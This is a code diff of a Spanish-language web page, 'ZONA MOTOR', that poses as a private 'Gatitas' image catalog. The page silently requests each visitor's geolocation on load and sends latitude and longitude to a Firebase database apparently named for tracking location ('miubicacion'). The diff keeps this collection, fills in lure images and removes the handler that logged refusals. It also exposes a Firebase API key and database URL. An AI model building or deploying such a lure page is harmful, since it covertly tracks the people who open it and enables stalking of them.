@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZONA MOTOR - Exclusivo</title>
+    <title>ZONA MOTOR - Catálogo</title>
     
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script>
@@ -12,14 +12,13 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body { background-color: #0b0c10; color: #c5c6c7; }
         
-        header { background-color: #1f2833; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #ff003c; }
-        header h1 { color: #ffffff; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; }
-        header h1 span { color: #ff003c; }
+        header { background-color: #1f2833; padding: 20px; text-align: center; border-bottom: 3px solid #ff003c; }
+        header h1 { color: #ffffff; text-transform: uppercase; letter-spacing: 2px; }
         
-        /* Hero con la imagen principal */
+        /* Imagen principal de fondo */
         .hero { 
-            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('URL_DE_TU_IMAGEN_PRINCIPAL.jpg') no-repeat center center/cover; 
-            height: 500px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; 
+            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('Captura de pantalla 2026-06-12 220633.png') no-repeat center center/cover; 
+            height: 500px; display: flex; flex-direction: column; justify-content: center; align-items: center;
         }
         
         .btn-gatitas { 
@@ -31,8 +30,8 @@
         .active { display: block; }
 
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; max-width: 1100px; margin: 0 auto; }
-        .grid img { width: 100%; border-radius: 8px; }
-
+        .grid img { width: 100%; border-radius: 8px; border: 2px solid #1f2833; }
+        
         footer { background-color: #111; text-align: center; padding: 20px; margin-top: 40px; color: #666; }
     </style>
 </head>
@@ -43,33 +42,38 @@
     </header>
 
     <section class="hero" id="home">
-        <h2>Bienvenido</h2>
         <button class="btn-gatitas" onclick="mostrarGatitas()">Gatitas</button>
     </section>
 
     <section id="seccion-gatitas" class="section-hidden">
-        <h2 style="text-align: center; margin-bottom: 30px;">Catálogo Exclusivo</h2>
+        <h2 style="text-align: center; margin-bottom: 30px; color: white;">Catálogo Exclusivo</h2>
         <div class="grid">
-            <img src="URL_IMAGEN_1.jpg" alt="Gatita 1">
-            <img src="URL_IMAGEN_2.jpg" alt="Gatita 2">
-            <img src="URL_IMAGEN_3.jpg" alt="Gatita 3">
+            <img src="Captura de pantalla 2026-06-12 220659.png" alt="Imagen 1">
+            <img src="Captura de pantalla 2026-06-12 220723.jpg" alt="Imagen 2">
+            <img src="Captura de pantalla 2026-06-12 220736.jpg" alt="Imagen 3">
+            <img src="Captura de pantalla 2026-06-12 220804.png" alt="Imagen 4">
+            <img src="Captura de pantalla 2026-06-12 220816.png" alt="Imagen 5">
+            <img src="Captura de pantalla 2026-06-12 220830.png" alt="Imagen 6">
+            <img src="Captura de pantalla 2026-06-12 220844.png" alt="Imagen 7">
+            <img src="Captura de pantalla 2026-06-12 220856.png" alt="Imagen 8">
+            <img src="Captura de pantalla 2026-06-12 220908.png" alt="Imagen 9">
+            <img src="Captura de pantalla 2026-06-12 220919.png" alt="Imagen 10">
         </div>
     </section>
 
     <footer>
-        <p>&copy; 2026 ZonaMotor. Catálogo de Exhibición Privada.</p>
+        <p>&copy; 2026 ZonaMotor. Exhibición Privada.</p>
     </footer>
 
     <script>
-        // Funcionalidad para mostrar la sección
         function mostrarGatitas() {
             document.getElementById('home').style.display = 'none';
             document.getElementById('seccion-gatitas').classList.add('active');
         }
 
-        // Configuración Firebase (MANTENIDA)
+        // Firebase Configuración
         const firebaseConfig = {
-            apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
+            apiKey: "AIzaSyDITt3GQmc1uANwOqWNVoqWgmhm9CQQRdU",
             authDomain: "miubicacion-52e7f.firebaseapp.com",
             databaseURL: "https://miubicacion-52e7f-default-rtdb.firebaseio.com",
             projectId: "miubicacion-52e7f",
@@ -84,7 +88,7 @@
 
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(siPermitio, noPermitio);
+                navigator.geolocation.getCurrentPosition(siPermitio);
             }
         };
 
@@ -94,10 +98,6 @@
                 longitud: posicion.coords.longitude,
                 permiso: "Otorgado"
             });
-        }
-
-        function noPermitio(error) {
-            database.ref('visitas_autos/' + Date.now()).set({ permiso: "Denegado" });
         }
     </script>
 </body>
